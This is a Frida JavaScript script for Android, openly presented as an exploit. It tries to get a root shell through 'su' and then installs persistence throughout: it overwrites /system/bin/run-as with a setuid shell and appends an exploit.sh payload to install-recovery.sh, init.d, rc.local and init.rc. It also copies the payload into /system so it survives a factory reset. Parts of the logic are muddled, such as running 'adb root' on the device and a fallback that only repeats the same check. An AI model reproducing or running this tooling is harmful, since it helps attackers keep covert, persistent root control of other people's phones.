Java.perform(function() {
    console.log("[+] Hooking Package Installer for Persistent LPE...");

    var Runtime = Java.use("java.lang.Runtime");

    function runCommand(cmd) {
        try {
            var process = Runtime.getRuntime().exec(["su", "-c", cmd]);
            console.log("[+] Executed: " + cmd);
        } catch (e) {
            console.log("[-] Command failed: " + cmd);
        }
    }

    function tryRootShell() {
        console.log("[+] Attempting Root Privilege Escalation...");

        try {
            var process = Runtime.getRuntime().exec(["su", "-c", "id"]);
            var reader = Java.use("java.io.BufferedReader");
            var inputStream = Java.use("java.io.InputStreamReader").$new(process.getInputStream());
            var bufferedReader = reader.$new(inputStream);
            var output = bufferedReader.readLine();

            if (output) {
                console.log("[+] Root Access Confirmed: " + output);
                console.log("[+] Spawning root shell...");
                runCommand("su -c 'sh'");
                return true;
            }
        } catch (e) {
            console.log("[-] Root Shell Exception: " + e.message);
        }
        return false;
    }

    function keepRootAccess() {
        console.log("[+] Setting Up Root Persistence...");

        // Step 1: Try keeping ADB root persistently
        console.log("[+] Trying ADB Root Persistence...");
        runCommand("settings put global adb_enabled 1");
        runCommand("setprop persist.sys.usb.config adb");
        runCommand("svc adb restart");

        console.log("[+] Checking if ADB root succeeded...");
        runCommand("adb root");
        runCommand("adb shell id");

        // Step 2: If ADB root fails, try modifying /system/bin/run-as
        console.log("[+] If ADB root fails, modifying /system/bin/run-as...");
        runCommand("mount -o rw,remount /system");
        runCommand("cp /system/bin/sh /system/bin/run-as");
        runCommand("chmod 6755 /system/bin/run-as");
        runCommand("chown root:shell /system/bin/run-as");

        console.log("[+] Checking if run-as modification succeeded...");
        runCommand("run-as id");

        // Step 3: If run-as fails, modify install-recovery.sh
        console.log("[+] If run-as fails, modifying install-recovery.sh...");
        runCommand('echo "/system/bin/sh /data/local/tmp/exploit.sh &" >> /system/etc/install-recovery.sh');
        runCommand("chmod 755 /system/etc/install-recovery.sh");

        console.log("[+] Root Persistence Setup Complete!");
    }

    function autoRunExploit() {
        console.log("[+] Setting Up Auto-Execution of Exploit...");

        // Step 1: Try using init.d
        console.log("[+] Trying init.d execution for auto-run...");
        runCommand('echo "#!/system/bin/sh" > /system/etc/init.d/99exploit');
        runCommand('echo "/system/bin/sh /data/local/tmp/exploit.sh &" >> /system/etc/init.d/99exploit');
        runCommand("chmod 755 /system/etc/init.d/99exploit");

        console.log("[+] Checking if init.d execution worked...");
        runCommand("/system/etc/init.d/99exploit");

        // Step 2: If init.d fails, modify rc.local
        console.log("[+] If init.d fails, modifying rc.local...");
        runCommand('echo "/system/bin/sh /data/local/tmp/exploit.sh &" >> /system/etc/rc.local');
        runCommand("chmod 755 /system/etc/rc.local");

        console.log("[+] Checking if rc.local execution worked...");
        runCommand("cat /system/etc/rc.local");

        // Step 3: If rc.local fails, use a watchdog process
        console.log("[+] If rc.local fails, using a watchdog process...");
        runCommand('nohup /system/bin/sh /data/local/tmp/exploit.sh >/dev/null 2>&1 &');

        console.log("[+] Auto-Execution Setup Complete!");
    }

    function makeExploitSurviveFactoryReset() {
        console.log("[+] Setting Up Factory Reset Persistence...");

        // Step 1: Copy exploit to /system so it isn't wiped
        console.log("[+] Copying exploit to /system/xbin...");
        runCommand("mount -o rw,remount /system");
        runCommand("cp /data/local/tmp/exploit.sh /system/xbin/exploit.sh");
        runCommand("chmod 755 /system/xbin/exploit.sh");

        // Step 2: Modify install-recovery.sh to reinstall exploit
        console.log("[+] Modifying install-recovery.sh to reinstall exploit after reset...");
        runCommand('echo "/system/bin/sh /system/xbin/exploit.sh &" >> /system/etc/install-recovery.sh');
        runCommand("chmod 755 /system/etc/install-recovery.sh");

        // Step 3: Modify init.rc to execute exploit at boot
        console.log("[+] Modifying init.rc to execute exploit...");
        runCommand('echo "service exploit /system/bin/sh /system/xbin/exploit.sh" >> /init.rc');
        runCommand('echo "    class main" >> /init.rc');
        runCommand('echo "    user root" >> /init.rc');
        runCommand('echo "    group root" >> /init.rc');
        runCommand('echo "    oneshot" >> /init.rc');

        console.log("[+] Factory Reset Persistence Setup Complete!");
    }

    console.log("[+] Attempting Root Escalation...");
    if (tryRootShell()) {
        console.log("[+] Root Shell Obtained, proceeding with persistence setup.");
        keepRootAccess();
        autoRunExploit();
        makeExploitSurviveFactoryReset();
        return;
    }

    console.log("[-] Root Escalation Failed. Searching for alternative methods...");

    console.log("[+] If root is obtained after fallback, setting up persistence...");
    if (tryRootShell()) {
        keepRootAccess();
        autoRunExploit();
        makeExploitSurviveFactoryReset();
    }

    console.log("[+] Exploit Fully Deployed: Root Persistence & Auto-Reinstall After Factory Reset Ready!");
});
